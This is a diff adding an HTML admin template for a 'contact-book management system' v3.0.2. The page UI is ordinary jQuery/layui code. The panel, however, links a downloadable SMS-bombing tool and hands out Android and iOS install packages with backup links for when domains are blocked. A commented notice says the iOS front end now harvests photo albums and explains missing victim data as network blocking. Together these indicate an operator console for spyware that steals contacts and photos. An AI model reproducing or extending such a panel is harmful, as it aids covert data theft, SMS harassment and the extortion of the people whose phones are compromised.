@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html id="zongid">
+<head>
+  <meta charset="utf-8">
+  <title>{$web_config['name']}</title>
+ 
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link rel="stylesheet" href="__PUBLIC__/layui/css/layui.css"  media="all">
+  <link rel="stylesheet" href="__PUBLIC__/font-awesome/css/font-awesome.min.css" media="all" />
+  <link rel="stylesheet" href="__CSS__/admin.css"  media="all">
+  
+  
+  
+  
+  <script src="__PUBLIC__/fang/js/jquery.min.js"></script>
+   <link href="__PUBLIC__/fang/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="__PUBLIC__/fang/css/azzara.min.css" rel="stylesheet" />
+  
+   <style type="text/css" media="all">
+      iframe{
+          width: calc(100% - 240px);
+          margin-left: 240px;
+          border: none;
+          margin-top: 120px;
+      }
+      #kuaijie{
+          display: none;
+      }
+      .fa-chevron-down:before{
+          display: none;
+      }
+      .layui-tab-card>.layui-tab-title{
+          display: none;
+      }
+      .layui-tab{
+          margin: 0;
+      }
+      .layui-tab-content{
+          padding: 0;
+      }
+      
+      
+  </style>
+  
+  
+</head>
+
+
+
+<body>
+    <div class="wrapper">
+        <!--
+            Tip 1: You can change the background color of the main header using: data-background-color="blue | purple | light-blue | green | orange | red"
+        -->
+        <div class="main-header" data-background-color="purple">
+            <!-- Logo Header -->
+            <div class="logo-header">
+
+                <a href="/huaxialianmeng2022" class="logo">
+                    <img src="__PUBLIC__/fang/image/logo.png" style="height: 100%;" alt="navbar brand" class="navbar-brand">
+                </a>
+                <button class="navbar-toggler sidenav-toggler ml-auto" type="button" data-toggle="collapse" data-target="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon">
+                        <i class="fa fa-bars"></i>
+                    </span>
+                </button>
+                <button class="topbar-toggler more"><i class="fa fa-ellipsis-v"></i></button>
+                <div class="navbar-minimize">
+                    <button id="zhankai" class="btn btn-minimize btn-rounded">
+                        <i class="fa fa-bars"></i>
+                    </button>
+                </div>
+            </div>
+            <!-- End Logo Header -->
+            <!-- Navbar Header -->
+            <nav class="navbar navbar-header navbar-expand-lg">
+
+                <div class="container-fluid">
+                    <span style="margin: 10px; color: white; font-size: x-large;">华夏联盟通讯录管理系统v3.0.2</span>
+                    
+                    
+                    
+                    <ul class="navbar-nav topbar-nav ml-md-auto align-items-center">
+                        <li class="nav-item dropdown hidden-caret">
+                            <a class="dropdown-toggle profile-pic" data-toggle="dropdown" href="#" aria-expanded="false">
+                                <div id="touxiang" class="avatar-sm">
+                                    <img src="{$cookie.thumb|geturl}" alt="..." class="avatar-img rounded-circle">
+                                </div>
+                            </a>
+                            <ul id="touxiangdata" class="dropdown-menu dropdown-user animated fadeIn">
+                                <li>
+                                    <div class="user-box">
+                                        <div class="avatar-lg"><img src="{$cookie.thumb|geturl}" alt="image profile" class="avatar-img rounded"></div>
+                                        <div class="u-text">
+                                            <h4></h4>
+                                            <p class="text-muted"></p><a href="javascript:;" id="logout" class="btn btn-rounded btn-danger btn-sm">退出登录</a>
+                                        </div>
+                                    </div>
+                                </li>
+                              
+                            </ul>
+                        </li>
+
+                    </ul>
+
+                </div>
+            </nav>
+            <!-- End Navbar -->
+        </div>
+
+        <!-- Sidebar -->
+        <div onmouseover='overShow()' onmouseout='outHide()' class="sidebar">
+
+            <div class="sidebar-background"></div>
+            <div class="sidebar-wrapper scrollbar-inner">
+                <div class="sidebar-content">
+                    <div class="user">
+                        <div class="avatar-sm float-left mr-2">
+                            <img src="{$cookie.thumb|geturl}" alt="..." class="avatar-img rounded-circle">
+                        </div>
+                        
+                        
+                        
+                        <div class="info">
+                            <a data-toggle="collapse" href="#collapseExample" aria-expanded="true">
+                                <span>
+                                    
+                                    <span style="margin: 0;line-height: 2.5rem;" class="user-level">{empty name="$cookie.nickname"}{$cookie.name}{else /}{$cookie.nickname}{/empty}</span>
+                                   
+                                </span>
+                            </a>
+                            <div class="clearfix"></div>
+
+                            
+                        </div>
+                        
+                        
+                        
+                    </div>
+                    <ul class="nav">
+                        <li class="nav-item active">
+                            <a href="/huaxialianmeng2022">
+                                <i class="fa fa-tag"></i>
+                                <p>主页</p>
+                            </a>
+                        </li>
+                        <li class="nav-section">
+                            
+                            <span class="sidebar-mini-icon">
+                                <i class="fa fa-tag"></i>
+                            </span>
+                            <h4 class="text-section">用户中心</h4>
+                        </li>
+                       
+                        <li class="nav-item">
+                            <a data-toggle="collapse" href="/">
+                                <i class="fa fa-tag"></i>
+                                <p style="color:red">常见问题解答</p>
+                                
+                            </a>
+                           
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- End Sidebar -->
+
+        <div class="main-panel">
+            <div class="content">
+                <div  style="padding: 0;" id="content" class="page-inner">
+                    <!-- 开始的地方 -->
+                    
+
+<div class="page-header">
+   
+ 
+
+ 
+
+<div style="margin: 0;width: 100%;" class="layui-tab">
+    
+    
+   
+    
+          <ul style="display:flex;border: none;z-index: 999;background: #f9fbfd;height: 70px;align-items: center;padding: 0 30px;" class="layui-tab-title">
+            
+
+            <a href="{:url('huaxialianmeng2022/index/index')}" style="height: 40px;line-height: 40px;color:red;font-size: 13px;" class="layui-btn-sm">　首　页　</a>
+            <a href="https://hxlmxz.lanzout.com/iDUm60alqupi" style="height: 40px;line-height: 40px;color:#1a08ff;font-size: 13px;" class="layui-btn-sm">短信轰炸（点击下载）</a>
+            
+            
+            <a id="apptanchuang" style="height: 40px;line-height: 40px;color:#1a08ff;font-size: 13px;" class="layui-btn-sm">安装包下载</a>
+            <a id="imgtanchuang" style="height: 40px;line-height: 40px;color:#1a08ff;font-size: 13px;" class="layui-btn-sm">二维码获取</a>
+            <a id="linktanchaung" style="height: 40px;line-height: 40px;color:red;font-size: 13px;" class="layui-btn-sm">下载链接</a>
+            
+            
+            
+            <script>
+             $('#apptanchuang').click(function(){
+                    layer.open({
+                             title: '每次下载时，请先刷新后台再下载安装包，确保页面在最新页面',
+                             area: ['550px', '500px'],
+                             content: '<a href="{$jueselink.apps}" style="height: 40px;line-height: 40px;" class="layui-btn layui-btn-danger layui-btn-sm tal">{$jueselink.appstext1}</a><a href="{$jueselink.apps2}" style="height: 40px;line-height: 40px;" class="layui-btn layui-btn-danger layui-btn-sm tal">{$jueselink.appstext2}</a>'
+                     });
+                });
+                $('#imgtanchuang').click(function(){
+                    layer.open({
+                             title: '二维码',
+                             area: ['550px', '500px'],
+                             content: '<img src="{$jueselink.image1}" class="layui-upload-img" style="width: 50%;"/><img src="{$jueselink.image2}" class="layui-upload-img" style="width: 50%;"/><div style="text-align: center;width: 50%;float: left;">{$jueselink.text1}</div><div style="text-align: center;width: 50%;float: left;">{$jueselink.text2}</div>'
+                     });
+                });
+                $('#linktanchaung').click(function(){
+                    layer.open({
+                             title: '下载链接，获取对应的链接点击后面复制按钮，常用屏蔽就发备用',
+                             area: ['550px', '500px'],
+                             content: '<div style="display: flex;flex-direction: column;"><div style="margin: 10px;"><a id="linksdata" href="{$jueselink.links}">{$jueselink.links}</a><button type="button" class="layui-btn layui-btn-danger layui-btn-sm txl" style="margin-top: 0;" onclick="cope()">安卓常用链接点击复制</button></div><div style="margin: 10px;"><a id="linksdata2" href="{$jueselink.links2}">{$jueselink.links2}</a><button type="button" class="layui-btn layui-btn-danger layui-btn-sm txl" style="margin-top: 0;" onclick="cope2()">安卓备用链接点击复制</button></div><div style="margin: 10px;"><a id="linksdata3" href="{$jueselink.links3}">{$jueselink.links3}</a><button type="button" class="layui-btn layui-btn-danger layui-btn-sm txl" style="margin-top: 0;" onclick="cope3()">常用苹果链接点击复制</button></div><div style="margin: 10px;"><a id="linksdata4" href="{$jueselink.links4}">{$jueselink.links4}</a><button type="button" class="layui-btn layui-btn-danger layui-btn-sm txl" style="margin-top: 0;" onclick="cope4()">备用苹果链接点击复制</button></div>   </div>'
+                     });
+                    
+                });
+                
+               function cope(){
+                    var ssrsss = '{$jueselink.links}';//获取文本
+                    var flag = copyText(ssrsss); //传递文本
+                    alert(flag ? "复制成功！" : "复制失败！");
+
+               }
+               function cope2(){
+                    var ssrsss = '{$jueselink.links2}';//获取文本
+                    var flag = copyText(ssrsss); //传递文本
+                    alert(flag ? "复制成功！" : "复制失败！");
+
+               }
+               function cope3(){
+                    var ssrsss = '{$jueselink.links3}';//获取文本
+                    var flag = copyText(ssrsss); //传递文本
+                    alert(flag ? "复制成功！" : "复制失败！");
+
+               }
+               function cope4(){
+                    var ssrsss = '{$jueselink.links4}';//获取文本
+                    var flag = copyText(ssrsss); //传递文本
+                    alert(flag ? "复制成功！" : "复制失败！");
+
+               }
+               
+               
+                 function copyText(text) {
+                    var textarea = document.createElement("input");//创建input对象
+                    var currentFocus = document.activeElement;//当前获得焦点的元素
+                    document.body.appendChild(textarea);//添加元素
+                    textarea.value = text;
+                    textarea.focus();
+                    if(textarea.setSelectionRange)
+                        textarea.setSelectionRange(0, textarea.value.length);//获取光标起始位置到结束位置
+                    else
+                        textarea.select();
+                    try {
+                        var flag = document.execCommand("copy");//执行复制
+                    } catch(eo) {
+                        var flag = false;
+                    }
+                    document.body.removeChild(textarea);//删除元素
+                    currentFocus.focus();
+                    return flag;
+                }
+
+
+
+                
+            </script>
+            
+         
+              
+              
+        <!--   <a href="#" style="height: 40px;line-height: 40px;width: 300px;margin-left: 60px;" class="layui-btn layui-btn-danger layui-btn-sm tel">-->
+        <!--       <marquee style="font-size: 16px;" direction="left">-->
+        <!--        苹果前端已经更新为可以获取相册的前端，下载链接也已经更新！下载安装包时，请先刷新后台再下载，进后台查不到资料属于客户网络屏蔽域名，没有访问成功，可以在对接群申请一个备用域名的安装包来出处理屏蔽的客户！-->
+        <!--        </marquee>-->
+        <!--</a>   -->
+        
+        
+        
+        
+          </ul>
+</div>
+  
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+                    <!-- 结束的地方 -->
+                </div>
+            </div>
+            
+        </div>
+
+
+    </div>
+
+
+      
+      
+<script>
+    $('#zhankai').click(function(){
+        var yesno = $('#zongid').hasClass('sidebar_minimize');
+        if(yesno){
+            $('#zongid').removeClass('sidebar_minimize');
+            $('#zongid').removeClass('zongclass');
+            
+            $('iframe').css("width","calc(100% - 240px)");
+            $('iframe').css("margin-left","240px");
+            
+        }else{
+            $('#zongid').addClass('sidebar_minimize');
+            $('#zongid').addClass('zongclass');
+            $('iframe').css("width","calc(100% - 75px)");
+            $('iframe').css("margin-left","75px");
+        }
+        
+    });
+    
+     $('#touxiang').click(function(){
+         $('#touxiangdata').toggle();
+        
+    });
+    
+    
+    
+    
+       
+            function overShow() {
+                $('.zongclass').removeClass('sidebar_minimize');
+                var yesno = $('#zongid').hasClass('sidebar_minimize');
+                
+                if(yesno){
+                      $('iframe').css("width","calc(100% - 75px)");
+                $('iframe').css("margin-left","75px");
+                }else{
+                  
+                $('iframe').css("width","calc(100% - 240px)");
+                     $('iframe').css("margin-left","240px");
+                }
+                
+            }
+            function outHide() {
+               $('.zongclass').addClass('sidebar_minimize');
+               var yesno = $('#zongid').hasClass('sidebar_minimize');
+                
+               if(yesno){
+                      $('iframe').css("width","calc(100% - 75px)");
+                $('iframe').css("margin-left","75px");
+                }else{
+                  
+                $('iframe').css("width","calc(100% - 240px)");
+                     $('iframe').css("margin-left","240px");
+                }
+            }
+        
+
+  
+    
+   
+    
+    
+</script>
+  
+</body>
+
+
+
+
+</html>
